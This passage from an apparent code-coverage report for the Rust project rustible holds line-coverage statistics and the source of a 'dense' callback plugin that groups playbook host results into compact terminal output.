s":{"Line":1}},{"line":433,"address":[31171210],"length":1,"stats":{"Line":1}},{"line":434,"address":[31171225],"length":1,"stats":{"Line":1}},{"line":436,"address":[31171239],"length":1,"stats":{"Line":1}},{"line":437,"address":[31171267],"length":1,"stats":{"Line":1}},{"line":438,"address":[31171287],"length":1,"stats":{"Line":1}},{"line":439,"address":[31171320],"length":1,"stats":{"Line":1}},{"line":440,"address":[31171340],"length":1,"stats":{"Line":1}},{"line":441,"address":[31171250],"length":1,"stats":{"Line":1}},{"line":442,"address":[31171620],"length":1,"stats":{"Line":1}},{"line":443,"address":[31171643],"length":1,"stats":{"Line":1}},{"line":444,"address":[31171666],"length":1,"stats":{"Line":1}},{"line":445,"address":[31171603],"length":1,"stats":{"Line":1}},{"line":446,"address":[31172018],"length":1,"stats":{"Line":1}},{"line":448,"address":[31171880],"length":1,"stats":{"Line":1}},{"line":453,"address":[31174142,31173616,31174148],"length":1,"stats":{"Line":1}},{"line":454,"address":[31173649],"length":1,"stats":{"Line":1}},{"line":459,"address":[31173684],"length":1,"stats":{"Line":0}},{"line":460,"address":[31173712],"length":1,"stats":{"Line":0}},{"line":461,"address":[31173888],"length":1,"stats":{"Line":0}},{"line":463,"address":[31173782],"length":1,"stats":{"Line":0}},{"line":468,"address":[31173732],"length":1,"stats":{"Line":0}},{"line":469,"address":[31174189],"length":1,"stats":{"Line":0}},{"line":470,"address":[31174229],"length":1,"stats":{"Line":0}},{"line":471,"address":[31174279,31174358],"length":1,"stats":{"Line":0}},{"line":472,"address":[31174571,31174537],"length":1,"stats":{"Line":0}},{"line":473,"address":[31174729,31174612],"length":1,"stats":{"Line":0}},{"line":475,"address":[31174585,31174647],"length":1,"stats":{"Line":0}},{"line":482,"address":[31174166],"length":1,"stats":{"Line":0}},{"line":483,"address":[31174896],"length":1,"stats":{"Line":0}},{"line":484,"address":[31175170,31175238,31175315],"length":1,"stats":{"Line":0}},{"line":490,"address":[31174910,31175038],"length":1,"stats":{"Line":0}},{"line":496,"address":[31175760],"length":1,"stats":{"Line":1}},{"line":497,"address":[31175796],"length":1,"stats":{"Line":1}},{"line":502,"address":[31179744],"length":1,"stats":{"Line":1}},{"line":503,"address":[31179752],"length":1,"stats":{"Line":1}},{"line":508,"address":[31179582,31177760,31179702],"length":1,"stats":{"Line":1}},{"line":510,"address":[31177798],"length":1,"stats":{"Line":1}},{"line":511,"address":[31177866],"length":1,"stats":{"Line":1}},{"line":512,"address":[31177922],"length":1,"stats":{"Line":1}},{"line":513,"address":[31177968,31178063],"length":1,"stats":{"Line":2}},{"line":514,"address":[31178089,31178186],"length":1,"stats":{"Line":2}},{"line":515,"address":[31178374,31178301,31178233],"length":1,"stats":{"Line":3}},{"line":516,"address":[31178489,31178562,31178421],"length":1,"stats":{"Line":3}},{"line":517,"address":[31178758,31178677,31178609],"length":1,"stats":{"Line":3}},{"line":518,"address":[31178864,31178793,31178945],"length":1,"stats":{"Line":3}},{"line":519,"address":[31179041,31178980],"length":1,"stats":{"Line":2}},{"line":530,"address":[30120082,30118496,30118635,30120146,30119551,30118608,30118524],"length":1,"stats":{"Line":4}},{"line":532,"address":[30118697,30118588],"length":1,"stats":{"Line":2}},{"line":533,"address":[30118833,30119098,30118860,30119036,30120088],"length":1,"stats":{"Line":1}},{"line":534,"address":[30119229],"length":1,"stats":{"Line":1}},{"line":535,"address":[30119360],"length":1,"stats":{"Line":1}},{"line":537,"address":[30119488],"length":1,"stats":{"Line":1}},{"line":538,"address":[30119572],"length":1,"stats":{"Line":0}},{"line":539,"address":[30119629,30119734],"length":1,"stats":{"Line":0}},{"line":545,"address":[30119598,30119660],"length":1,"stats":{"Line":0}},{"line":550,"address":[31161339],"length":1,"stats":{"Line":4}},{"line":552,"address":[30110086],"length":1,"stats":{"Line":1}},{"line":554,"address":[30110170],"length":1,"stats":{"Line":1}},{"line":557,"address":[30110302,30110223],"length":1,"stats":{"Line":2}},{"line":558,"address":[30110348,30110428],"length":1,"stats":{"Line":2}},{"line":560,"address":[30110435,30110633],"length":1,"stats":{"Line":2}},{"line":561,"address":[30112222,30110701],"length":1,"stats":{"Line":2}},{"line":562,"address":[30112308],"length":1,"stats":{"Line":1}},{"line":565,"address":[30112376],"length":1,"stats":{"Line":1}},{"line":566,"address":[30112493],"length":1,"stats":{"Line":1}},{"line":567,"address":[30112611],"length":1,"stats":{"Line":1}},{"line":569,"address":[30112729],"length":1,"stats":{"Line":1}},{"line":570,"address":[30112847],"length":1,"stats":{"Line":1}},{"line":571,"address":[30112965],"length":1,"stats":{"Line":1}},{"line":572,"address":[30113083],"length":1,"stats":{"Line":1}},{"line":574,"address":[30113196,30113387],"length":1,"stats":{"Line":2}},{"line":582,"address":[30110840,30110739],"length":1,"stats":{"Line":2}},{"line":583,"address":[30110947,30110892],"length":1,"stats":{"Line":2}},{"line":584,"address":[30110970],"length":1,"stats":{"Line":1}},{"line":586,"address":[30110984],"length":1,"stats":{"Line":1}},{"line":587,"address":[30111304,30111017],"length":1,"stats":{"Line":2}},{"line":588,"address":[30111341,30111377],"length":1,"stats":{"Line":0}},{"line":590,"address":[30111310,30111372],"length":1,"stats":{"Line":2}},{"line":593,"address":[30111079,30110998],"length":1,"stats":{"Line":0}},{"line":594,"address":[30111178,30111116],"length":1,"stats":{"Line":0}},{"line":596,"address":[30111085,30111147],"length":1,"stats":{"Line":0}},{"line":600,"address":[30111149,30111537],"length":1,"stats":{"Line":2}},{"line":601,"address":[30111564],"length":1,"stats":{"Line":1}},{"line":602,"address":[30111644,30111810],"length":1,"stats":{"Line":0}},{"line":604,"address":[30111593,30111664],"length":1,"stats":{"Line":2}},{"line":608,"address":[30112080],"length":1,"stats":{"Line":1}},{"line":611,"address":[31161181],"length":1,"stats":{"Line":4}},{"line":612,"address":[30107575,30107746,30108367,30107526,30107808],"length":1,"stats":{"Line":1}},{"line":616,"address":[30107968],"length":1,"stats":{"Line":1}},{"line":617,"address":[30108012,30108091],"length":1,"stats":{"Line":2}},{"line":618,"address":[30108204,30108294],"length":1,"stats":{"Line":2}},{"line":622,"address":[30108241],"length":1,"stats":{"Line":1}},{"line":625,"address":[31161115],"length":1,"stats":{"Line":4}},{"line":626,"address":[30107098,30107394,30107355,30107210,30107159,30107033],"length":1,"stats":{"Line":1}},{"line":629,"address":[30109940,30108578,30108448,30108476,30109809,30108613,30109870],"length":1,"stats":{"Line":4}},{"line":630,"address":[30108657,30108550],"length":1,"stats":{"Line":2}},{"line":631,"address":[30109889,30108665,30108861,30108731],"length":1,"stats":{"Line":2}},{"line":634,"address":[30108967],"length":1,"stats":{"Line":1}},{"line":635,"address":[30109146],"length":1,"stats":{"Line":1}},{"line":636,"address":[30109309,30109825,30109336,30109575,30109876,30109515],"length":1,"stats":{"Line":1}},{"line":637,"address":[30109705],"length":1,"stats":{"Line":1}},{"line":640,"address":[30109276,30109732],"length":1,"stats":{"Line":2}},{"line":641,"address":[30109748,30109794],"length":1,"stats":{"Line":2}},{"line":645,"address":[30117709,30114136,30113984,30114106,30114015,30114780,30116041],"length":1,"stats":{"Line":5}},{"line":648,"address":[30114183,30114077],"length":1,"stats":{"Line":2}},{"line":649,"address":[30114259,30114199],"length":1,"stats":{"Line":2}},{"line":651,"address":[30114360,30114683],"length":1,"stats":{"Line":2}},{"line":652,"address":[30114680,30114404,30114688],"length":1,"stats":{"Line":2}},{"line":653,"address":[30114502,30114381],"length":1,"stats":{"Line":2}},{"line":654,"address":[30114499,30114504,30114440],"length":1,"stats":{"Line":2}},{"line":655,"address":[30114607,30114642,30114469],"length":1,"stats":{"Line":3}},{"line":656,"address":[30114644,30114575,30114639],"length":1,"stats":{"Line":2}},{"line":658,"address":[30114609,30114550,30114605],"length":1,"stats":{"Line":2}},{"line":663,"address":[30114717,30114761],"length":1,"stats":{"Line":2}},{"line":666,"address":[30114843,30114738],"length":1,"stats":{"Line":2}},{"line":670,"address":[30114812],"length":1,"stats":{"Line":1}},{"line":671,"address":[30114974,30114883],"length":1,"stats":{"Line":2}},{"line":674,"address":[30115005,30115126],"length":1,"stats":{"Line":2}},{"line":676,"address":[30115049,30117469],"length":1,"stats":{"Line":0}},{"line":677,"address":[30115103],"length":1,"stats":{"Line":1}},{"line":679,"address":[30115200,30116823],"length":1,"stats":{"Line":2}},{"line":680,"address":[30117038,30116943],"length":1,"stats":{"Line":1}},{"line":681,"address":[30117075],"length":1,"stats":{"Line":0}},{"line":682,"address":[30117147,30117256],"length":1,"stats":{"Line":0}},{"line":684,"address":[30117104,30117172],"length":1,"stats":{"Line":0}},{"line":687,"address":[30117001,30117445],"length":1,"stats":{"Line":2}},{"line":690,"address":[30115149,30115290],"length":1,"stats":{"Line":2}},{"line":692,"address":[30115410],"length":1,"stats":{"Line":1}},{"line":693,"address":[30115491,30115447],"length":1,"stats":{"Line":2}},{"line":694,"address":[30115548,30115657],"length":1,"stats":{"Line":0}},{"line":696,"address":[30115505,30115583],"length":1,"stats":{"Line":2}},{"line":700,"address":[30116047,30115458],"length":1,"stats":{"Line":2}},{"line":703,"address":[30116074],"length":1,"stats":{"Line":1}},{"line":704,"address":[30116190,30116125],"length":1,"stats":{"Line":0}},{"line":705,"address":[30116205,30116284],"length":1,"stats":{"Line":0}},{"line":706,"address":[30116503,30116466],"length":1,"stats":{"Line":0}},{"line":707,"address":[30116544,30116661],"length":1,"stats":{"Line":0}},{"line":709,"address":[30116517,30116579],"length":1,"stats":{"Line":0}},{"line":716,"address":[30116160],"length":1,"stats":{"Line":1}},{"line":718,"address":[30117586],"length":1,"stats":{"Line":1}},{"line":721,"address":[30120377,30120265,30120292,30120176,30121112,30120204],"length":1,"stats":{"Line":0}},{"line":722,"address":[30120254,30120335],"length":1,"stats":{"Line":0}},{"line":723,"address":[30120398],"length":1,"stats":{"Line":0}},{"line":724,"address":[30120838,30120589,30120661],"length":1,"stats":{"Line":0}},{"line":730,"address":[30120486,30120424],"length":1,"stats":{"Line":0}},{"line":735,"address":[30117860,30117744,30117945,30118461,30117833,30117772],"length":1,"stats":{"Line":0}},{"line":736,"address":[30117903,30117822],"length":1,"stats":{"Line":0}},{"line":737,"address":[30117966],"length":1,"stats":{"Line":0}},{"line":738,"address":[30118023,30118130],"length":1,"stats":{"Line":0}},{"line":740,"address":[30117992,30118051],"length":1,"stats":{"Line":0}},{"line":758,"address":[31176256],"length":1,"stats":{"Line":1}},{"line":760,"address":[31176260],"length":1,"stats":{"Line":1}},{"line":765,"address":[31176752],"length":1,"stats":{"Line":1}},{"line":766,"address":[31176795],"length":1,"stats":{"Line":1}},{"line":767,"address":[31176799],"length":1,"stats":{"Line":1}},{"line":771,"address":[31176560],"length":1,"stats":{"Line":1}},{"line":772,"address":[31176605],"length":1,"stats":{"Line":1}},{"line":773,"address":[31176609],"length":1,"stats":{"Line":1}},{"line":777,"address":[31176656],"length":1,"stats":{"Line":1}},{"line":778,"address":[31176701],"length":1,"stats":{"Line":1}},{"line":779,"address":[31176705],"length":1,"stats":{"Line":1}},{"line":783,"address":[31176160],"length":1,"stats":{"Line":1}},{"line":784,"address":[31176205],"length":1,"stats":{"Line":1}},{"line":785,"address":[31176209],"length":1,"stats":{"Line":1}},{"line":789,"address":[31176064],"length":1,"stats":{"Line":1}},{"line":790,"address":[31176109],"length":1,"stats":{"Line":1}},{"line":791,"address":[31176113],"length":1,"stats":{"Line":1}},{"line":795,"address":[31176464],"length":1,"stats":{"Line":1}},{"line":796,"address":[31176509],"length":1,"stats":{"Line":1}},{"line":797,"address":[31176513],"length":1,"stats":{"Line":1}},{"line":801,"address":[31176336],"length":1,"stats":{"Line":1}},{"line":802,"address":[31176383],"length":1,"stats":{"Line":1}}],"covered":201,"coverable":262},{"path":["/","home","artur","Repositories","rustible","src","callback","plugins","dense.rs"],"content":"//! Dense callback plugin - compact output for large inventories\n//!\n//! This plugin provides compact output optimized for playbooks running on many hosts:\n//! - Groups hosts by task result status (ok, changed, failed, skipped, unreachable)\n//! - Shows multiple hosts per line\n//! - Uses count-based display when many hosts have the same status\n//! - Reduces output noise for large-scale deployments\n//!\n//! # Example Output\n//!\n//! ```text\n//! PLAY [Configure web servers] ******************************************\n//!\n//! TASK [Install nginx] **************************************************\n//!   ok: web[01:05]\n//!   changed: web[06:10], db01\n//!\n//! TASK [Start service] **************************************************\n//!   ok: (15 hosts)\n//!   failed: web08 =\u003e Connection refused\n//!\n//! PLAY RECAP ************************************************************\n//!   15 total hosts: ok=10 changed=4 failed=1\n//!\n//!   Failed hosts:\n//!     web08: ok=2 changed=0 failed=1 unreachable=0\n//! ```\n//!\n//! # Usage\n//!\n//! ```rust,ignore\n//! use rustible::callback::plugins::DenseCallback;\n//! use std::sync::Arc;\n//!\n//! let callback = Arc::new(DenseCallback::new());\n//! executor.add_callback(callback);\n//! ```\n\nuse async_trait::async_trait;\nuse colored::Colorize;\nuse parking_lot::RwLock;\nuse std::collections::HashMap;\nuse std::sync::Arc;\nuse std::time::Instant;\n\nuse crate::facts::Facts;\nuse crate::traits::{ExecutionCallback, ExecutionResult};\n\n/// Configuration for the dense callback plugin.\n#[derive(Debug, Clone)]\npub struct DenseConfig {\n    /// Maximum hosts to show per line before wrapping\n    pub max_hosts_per_line: usize,\n    /// Threshold above which to show \"(N hosts)\" instead of listing\n    pub host_count_threshold: usize,\n    /// Use colored output\n    pub use_colors: bool,\n    /// Verbosity level (0 = normal, 1+ = more details)\n    pub verbosity: u8,\n}\n\nimpl Default for DenseConfig {\n    fn default() -\u003e Self {\n        Self {\n            max_hosts_per_line: 6,\n            host_count_threshold: 10,\n            use_colors: true,\n            verbosity: 0,\n        }\n    }\n}\n\nimpl DenseConfig {\n    /// Create a new configuration with defaults.\n    pub fn new() -\u003e Self {\n        Self::default()\n    }\n\n    /// Set maximum hosts per line.\n    pub fn with_max_hosts_per_line(mut self, n: usize) -\u003e Self {\n        self.max_hosts_per_line = n;\n        self\n    }\n\n    /// Set host count threshold for count-based display.\n    pub fn with_host_count_threshold(mut self, n: usize) -\u003e Self {\n        self.host_count_threshold = n;\n        self\n    }\n\n    /// Enable or disable colors.\n    pub fn with_colors(mut self, enabled: bool) -\u003e Self {\n        self.use_colors = enabled;\n        self\n    }\n\n    /// Set verbosity level.\n    pub fn with_verbosity(mut self, level: u8) -\u003e Self {\n        self.verbosity = level;\n        self\n    }\n}\n\n/// Categories for grouping task results\n#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]\nenum ResultCategory {\n    Ok,\n    Changed,\n    Skipped,\n    Failed,\n    Unreachable,\n}\n\nimpl ResultCategory {\n    fn from_execution_result(result: \u0026ExecutionResult) -\u003e Self {\n        if !result.result.success {\n            ResultCategory::Failed\n        } else if result.result.skipped {\n            ResultCategory::Skipped\n        } else if result.result.changed {\n            ResultCategory::Changed\n        } else {\n            ResultCategory::Ok\n        }\n    }\n\n    fn label(\u0026self) -\u003e \u0026'static str {\n        match self {\n            ResultCategory::Ok =\u003e \"ok\",\n            ResultCategory::Changed =\u003e \"changed\",\n            ResultCategory::Skipped =\u003e \"skipping\",\n            ResultCategory::Failed =\u003e \"failed\",\n            ResultCategory::Unreachable =\u003e \"unreachable\",\n        }\n    }\n\n    /// Order for display (errors first for visibility)\n    fn display_order(\u0026self) -\u003e u8 {\n        match self {\n            ResultCategory::Failed =\u003e 0,\n            ResultCategory::Unreachable =\u003e 1,\n            ResultCategory::Changed =\u003e 2,\n            ResultCategory::Ok =\u003e 3,\n            ResultCategory::Skipped =\u003e 4,\n        }\n    }\n}\n\n/// Accumulated task result for grouping\n#[derive(Debug, Clone)]\nstruct AccumulatedResult {\n    host: String,\n    msg: Option\u003cString\u003e,\n}\n\n/// Per-host execution statistics\n#[derive(Debug, Clone, Default)]\nstruct HostStats {\n    ok: u32,\n    changed: u32,\n    failed: u32,\n    skipped: u32,\n    unreachable: u32,\n}\n\nimpl HostStats {\n    fn has_failures(\u0026self) -\u003e bool {\n        self.failed \u003e 0 || self.unreachable \u003e 0\n    }\n\n    fn has_changes(\u0026self) -\u003e bool {\n        self.changed \u003e 0\n    }\n}\n\n/// Dense callback plugin for compact output with large inventories.\n///\n/// This plugin groups hosts by their task result status and displays them\n/// compactly, making it ideal for playbooks targeting many hosts.\n///\n/// # Features\n///\n/// - **Host Grouping**: Groups hosts by status (ok, changed, failed, etc.)\n/// - **Range Compression**: `web01, web02, web03` becomes `web[01:03]`\n/// - **Count Display**: Shows `(15 hosts)` when many hosts have same status\n/// - **Compact Recap**: Shows summary with detailed info only for failures\n///\n/// # Design Principles\n///\n/// 1. **Minimal Noise**: Reduce output for large inventories\n/// 2. **Failure Visibility**: Always show failure details prominently\n/// 3. **Smart Compression**: Use ranges and counts where appropriate\n/// 4. **Fast Scanning**: Put important info (failures) first\n#[derive(Debug)]\npub struct DenseCallback {\n    config: DenseConfig,\n    /// Accumulated results for current task (grouped by status)\n    current_task_results: Arc\u003cRwLock\u003cHashMap\u003cResultCategory, Vec\u003cAccumulatedResult\u003e\u003e\u003e\u003e,\n    /// Current task name\n    current_task_name: Arc\u003cRwLock\u003cOption\u003cString\u003e\u003e\u003e,\n    /// Per-host statistics\n    host_stats: Arc\u003cRwLock\u003cHashMap\u003cString, HostStats\u003e\u003e\u003e,\n    /// Playbook start time\n    start_time: Arc\u003cRwLock\u003cOption\u003cInstant\u003e\u003e\u003e,\n    /// Whether task header has been printed\n    task_header_printed: Arc\u003cRwLock\u003cbool\u003e\u003e,\n}\n\nimpl DenseCallback {\n    /// Create a new dense callback with default configuration.\n    pub fn new() -\u003e Self {\n        Self::with_config(DenseConfig::default())\n    }\n\n    /// Create a new dense callback with custom configuration.\n    pub fn with_config(config: DenseConfig) -\u003e Self {\n        Self {\n            config,\n            current_task_results: Arc::new(RwLock::new(HashMap::new())),\n            current_task_name: Arc::new(RwLock::new(None)),\n            host_stats: Arc::new(RwLock::new(HashMap::new())),\n            start_time: Arc::new(RwLock::new(None)),\n            task_header_printed: Arc::new(RwLock::new(false)),\n        }\n    }\n\n    /// Format a list of hosts compactly.\n    ///\n    /// Strategies used:\n    /// 1. If count \u003e threshold: show \"(N hosts)\"\n    /// 2. Try to detect ranges: host01, host02, host03 -\u003e host[01:03]\n    /// 3. Otherwise list hosts with max_per_line limit\n    fn format_hosts(\u0026self, hosts: \u0026[String]) -\u003e String {\n        if hosts.is_empty() {\n            return String::new();\n        }\n\n        // If too many hosts, just show count\n        if hosts.len() \u003e self.config.host_count_threshold {\n            return format!(\"({} hosts)\", hosts.len());\n        }\n\n        // Try to compress into ranges\n        let compressed = Self::compress_host_ranges(hosts);\n\n        // If we got good compression, use it\n        if compressed.len() \u003c hosts.len() {\n            return Self::format_host_list(\u0026compressed, self.config.max_hosts_per_line);\n        }\n\n        // Otherwise just list them\n        Self::format_host_list(hosts, self.config.max_hosts_per_line)\n    }\n\n    /// Attempt to compress sequential hosts into ranges.\n    /// e.g., [\"web01\", \"web02\", \"web03\"] -\u003e [\"web[01:03]\"]\n    fn compress_host_ranges(hosts: \u0026[String]) -\u003e Vec\u003cString\u003e {\n        if hosts.len() \u003c 3 {\n            return hosts.to_vec();\n        }\n\n        let mut result = Vec::new();\n        let mut hosts_sorted = hosts.to_vec();\n        hosts_sorted.sort();\n\n        // Group hosts by prefix\n        let mut groups: HashMap\u003cString, Vec\u003c(String, u32)\u003e\u003e = HashMap::new();\n\n        for host in \u0026hosts_sorted {\n            if let Some((prefix, num)) = Self::extract_host_prefix_and_number(host) {\n                groups.entry(prefix).or_default().push((host.clone(), num));\n            } else {\n                result.push(host.clone());\n            }\n        }\n\n        // Process each group\n        for (prefix, mut host_nums) in groups {\n            if host_nums.len() \u003c 3 {\n                // Not worth compressing\n                for (host, _) in host_nums {\n                    result.push(host);\n                }\n                continue;\n            }\n\n            host_nums.sort_by_key(|(_, n)| *n);\n\n            // Find consecutive ranges\n            let mut i = 0;\n            while i \u003c host_nums.len() {\n                let start = host_nums[i].1;\n                let mut end = start;\n                let mut j = i + 1;\n\n                while j \u003c host_nums.len() \u0026\u0026 host_nums[j].1 == end + 1 {\n                    end = host_nums[j].1;\n                    j += 1;\n                }\n\n                if j - i \u003e= 3 {\n                    // Worth compressing - find the width from original hostname\n                    let width = Self::number_width(\u0026host_nums[i].0);\n                    result.push(format!(\n                        \"{}[{:0width$}:{:0width$}]\",\n                        prefix,\n                        start,\n                        end,\n                        width = width\n                    ));\n                } else {\n                    // Just add individually\n                    for k in i..j {\n                        result.push(host_nums[k].0.clone());\n                    }\n                }\n\n                i = j;\n            }\n        }\n\n        result.sort();\n        result\n    }\n\n    /// Extract prefix and trailing number from hostname.\n    /// e.g., \"web01\" -\u003e Some((\"web\", 1))\n    fn extract_host_prefix_and_number(host: \u0026str) -\u003e Option\u003c(String, u32)\u003e {\n        // Find where the trailing digits start\n        let digit_start = host\n            .char_indices()\n            .rev()\n            .take_while(|(_, c)| c.is_ascii_digit())\n            .last()\n            .map(|(i, _)| i);\n\n        if let Some(start) = digit_start {\n            if start \u003e 0 {\n                let prefix = \u0026host[..start];\n                let num_str = \u0026host[start..];\n                if let Ok(num) = num_str.parse::\u003cu32\u003e() {\n                    return Some((prefix.to_string(), num));\n                }\n            }\n        }\n\n        None\n    }\n\n    /// Determine the width of the number portion in a hostname.\n    fn number_width(host: \u0026str) -\u003e usize {\n        host.chars()\n            .rev()\n            .take_while(|c| c.is_ascii_digit())\n            .count()\n    }\n\n    /// Format a list of hosts with line limit.\n    fn format_host_list(hosts: \u0026[String], max_per_line: usize) -\u003e String {\n        if hosts.is_empty() {\n            return String::new();\n        }\n\n        if hosts.len() \u003c= max_per_line {\n            return hosts.join(\", \");\n        }\n\n        // Split across lines\n        let mut lines = Vec::new();\n        for chunk in hosts.chunks(max_per_line) {\n            lines.push(chunk.join(\", \"));\n        }\n        lines.join(\",\\n          \")\n    }\n\n    /// Print accumulated results for a category.\n    fn print_category(\u0026self, category: ResultCategory, results: \u0026[AccumulatedResult]) {\n        if results.is_empty() {\n            return;\n        }\n\n        let hosts: Vec\u003cString\u003e = results.iter().map(|r| r.host.clone()).collect();\n        let host_str = self.format_hosts(\u0026hosts);\n        let label = category.label();\n\n        if self.config.use_colors {\n            let colored_label = match category {\n                ResultCategory::Ok =\u003e label.green(),\n                ResultCategory::Changed =\u003e label.yellow(),\n                ResultCategory::Skipped =\u003e label.cyan(),\n                ResultCategory::Failed =\u003e label.red(),\n                ResultCategory::Unreachable =\u003e label.red(),\n            };\n            print!(\"  {}: \", colored_label);\n        } else {\n            print!(\"  {}: \", label);\n        }\n\n        // For failures, show messages too\n        if category == ResultCategory::Failed || category == ResultCategory::Unreachable {\n            if results.len() == 1 {\n                let result = \u0026results[0];\n                if self.config.use_colors {\n                    print!(\"{}\", result.host.bright_white().bold());\n                } else {\n                    print!(\"{}\", result.host);\n                }\n                if let Some(ref msg) = result.msg {\n                    print!(\" =\u003e {}\", msg);\n                }\n                println!();\n            } else {\n                // Multiple failures - list each with message\n                println!();\n                for result in results {\n                    if self.config.use_colors {\n                        print!(\"    {}\", result.host.bright_white().bold());\n                    } else {\n                        print!(\"    {}\", result.host);\n                    }\n                    if let Some(ref msg) = result.msg {\n                        print!(\" =\u003e {}\", msg);\n                    }\n                    println!();\n                }\n            }\n        } else {\n            // Non-failure: just show hosts\n            if self.config.use_colors {\n                println!(\"{}\", host_str.bright_white());\n            } else {\n                println!(\"{}\", host_str);\n            }\n        }\n    }\n\n    /// Flush accumulated task results to output.\n    fn flush_task_results(\u0026self) {\n        let mut results = self.current_task_results.write();\n        if results.is_empty() {\n            return;\n        }\n\n        // Sort categories by display order\n        let mut categories: Vec\u003c_\u003e = results.keys().copied().collect();\n        categories.sort_by_key(|c| c.display_order());\n\n        for category in categories {\n            if let Some(cat_results) = results.get(\u0026category) {\n                self.print_category(category, cat_results);\n            }\n        }\n\n        results.clear();\n    }\n\n    /// Print the play header.\n    fn print_play_header(\u0026self, name: \u0026str, host_count: usize) {\n        let header = format!(\"PLAY [{}]\", name);\n        let stars = \"*\".repeat(80_usize.saturating_sub(header.len()));\n\n        if self.config.use_colors {\n            println!(\n                \"\\n{} {}\",\n                header.bright_white().bold(),\n                stars.bright_black()\n            );\n        } else {\n            println!(\"\\n{} {}\", header, stars);\n        }\n\n        if self.config.verbosity \u003e 0 {\n            println!(\"  Targeting {} hosts\", host_count);\n        }\n    }\n\n    /// Print the task header.\n    fn print_task_header(\u0026self, name: \u0026str) {\n        let header = format!(\"TASK [{}]\", name);\n        let stars = \"*\".repeat(80_usize.saturating_sub(header.len()));\n\n        if self.config.use_colors {\n            println!(\n                \"\\n{} {}\",\n                header.bright_white().bold(),\n                stars.bright_black()\n            );\n        } else {\n            println!(\"\\n{} {}\", header, stars);\n        }\n    }\n\n    /// Print the final recap with host statistics.\n    fn print_final_recap(\u0026self) {\n        let header = \"PLAY RECAP\";\n        let stars = \"*\".repeat(80 - header.len());\n\n        if self.config.use_colors {\n            println!(\n                \"\\n{} {}\",\n                header.bright_white().bold(),\n                stars.bright_black()\n            );\n        } else {\n            println!(\"\\n{} {}\", header, stars);\n        }\n\n        let stats = self.host_stats.read();\n\n        // Calculate summary\n        let mut total_ok = 0u32;\n        let mut total_changed = 0u32;\n        let mut total_failed = 0u32;\n        let mut failed_hosts = Vec::new();\n        let mut changed_hosts = Vec::new();\n\n        for (host, host_stats) in stats.iter() {\n            total_ok += host_stats.ok;\n            total_changed += host_stats.changed;\n            total_failed += host_stats.failed;\n\n            if host_stats.has_failures() {\n                failed_hosts.push((host.clone(), host_stats.clone()));\n            } else if host_stats.has_changes() {\n                changed_hosts.push(host.clone());\n            }\n        }\n\n        // Print summary line\n        if self.config.use_colors {\n            println!(\n                \"\\n  {} total hosts: {}={} {}={} {}={}\",\n                stats.len(),\n                \"ok\".green(),\n                total_ok,\n                \"changed\".yellow(),\n                total_changed,\n                \"failed\".red(),\n                total_failed\n            );\n        } else {\n            println!(\n                \"\\n  {} total hosts: ok={} changed={} failed={}\",\n                stats.len(),\n                total_ok,\n                total_changed,\n                total_failed\n            );\n        }\n\n        // Print failed hosts with details\n        if !failed_hosts.is_empty() {\n            if self.config.use_colors {\n                println!(\"\\n  {}:\", \"Failed hosts\".red().bold());\n            } else {\n                println!(\"\\n  Failed hosts:\");\n            }\n\n            for (host, host_stats) in \u0026failed_hosts {\n                if self.config.use_colors {\n                    println!(\n                        \"    {}: ok={} changed={} failed={} unreachable={}\",\n                        host.red().bold(),\n                        host_stats.ok.to_string().green(),\n                        host_stats.changed.to_string().yellow(),\n                        host_stats.failed.to_string().red(),\n                        host_stats.unreachable.to_string().red()\n                    );\n                } else {\n                    println!(\n                        \"    {}: ok={} changed={} failed={} unreachable={}\",\n                        host,\n                        host_stats.ok,\n                        host_stats.changed,\n                        host_stats.failed,\n                        host_stats.unreachable\n                    );\n                }\n            }\n        }\n\n        // Show changed hosts if verbose\n        if self.config.verbosity \u003e 0 \u0026\u0026 !changed_hosts.is_empty() {\n            let hosts_str = self.format_hosts(\u0026changed_hosts);\n            if self.config.use_colors {\n                println!(\"\\n  {}: {}\", \"Changed hosts\".yellow(), hosts_str);\n            } else {\n                println!(\"\\n  Changed hosts: {}\", hosts_str);\n            }\n        }\n    }\n}\n\nimpl Default for DenseCallback {\n    fn default() -\u003e Self {\n        Self::new()\n    }\n}\n\nimpl Clone for DenseCallback {\n    fn clone(\u0026self) -\u003e Self {\n        Self {\n            config: self.config.clone(),\n            current_task_results: Arc::clone(\u0026self.current_task_results),\n            current_task_name: Arc::clone(\u0026self.current_task_name),\n            host_stats: Arc::clone(\u0026self.host_stats),\n            start_time: Arc::clone(\u0026self.start_time),\n            task_header_printed: Arc::clone(\u0026self.task_header_printed),\n        }\n    }\n}\n\n#[async_trait]\nimpl ExecutionCallback for DenseCallback {\n    async fn on_playbook_start(\u0026self, name: \u0026str) {\n        *self.start_time.write() = Some(Instant::now());\n        self.host_stats.write().clear();\n\n        if self.config.verbosity \u003e 0 {\n            if self.config.use_colors {\n                println!(\"{}: {}\", \"Playbook\".bright_black(), name.bright_white());\n            } else {\n                println!(\"Playbook: {}\", name);\n            }\n        }\n    }\n\n    async fn on_playbook_end(\u0026self, name: \u0026str, success: bool) {\n        // Flush any remaining results\n        self.flush_task_results();\n\n        // Print final recap\n        self.print_final_recap();\n\n        let start_time = *self.start_time.read();\n        if let Some(start) = start_time {\n            let duration = start.elapsed();\n            let status = if success {\n                if self.config.use_colors {\n                    \"completed\".green()\n                } else {\n                    \"completed\".into()\n                }\n            } else if self.config.use_colors {\n                \"failed\".red().bold()\n            } else {\n                \"failed\".into()\n            };\n\n            println!(\n                \"\\n{} {} in {:.2}s\",\n                if self.config.use_colors {\n                    name.bright_white().bold().to_string()\n                } else {\n                    name.to_string()\n                },\n                status,\n                duration.as_secs_f64()\n            );\n        }\n    }\n\n    async fn on_play_start(\u0026self, name: \u0026str, hosts: \u0026[String]) {\n        // Flush any pending results\n        self.flush_task_results();\n\n        self.print_play_header(name, hosts.len());\n\n        // Initialize stats for all hosts\n        let mut stats = self.host_stats.write();\n        for host in hosts {\n            stats.entry(host.clone()).or_default();\n        }\n    }\n\n    async fn on_play_end(\u0026self, _name: \u0026str, _success: bool) {\n        // Flush any pending results\n        self.flush_task_results();\n    }\n\n    async fn on_task_start(\u0026self, name: \u0026str, _host: \u0026str) {\n        // Check if we need to print a new task header\n        let current_name = self.current_task_name.read().clone();\n        if current_name.as_deref() != Some(name) {\n            // Flush previous task results\n            self.flush_task_results();\n\n            // Print new task header\n            self.print_task_header(name);\n            *self.current_task_name.write() = Some(name.to_string());\n            *self.task_header_printed.write() = true;\n        }\n    }\n\n    async fn on_task_complete(\u0026self, result: \u0026ExecutionResult) {\n        // Update host stats\n        {\n            let mut stats = 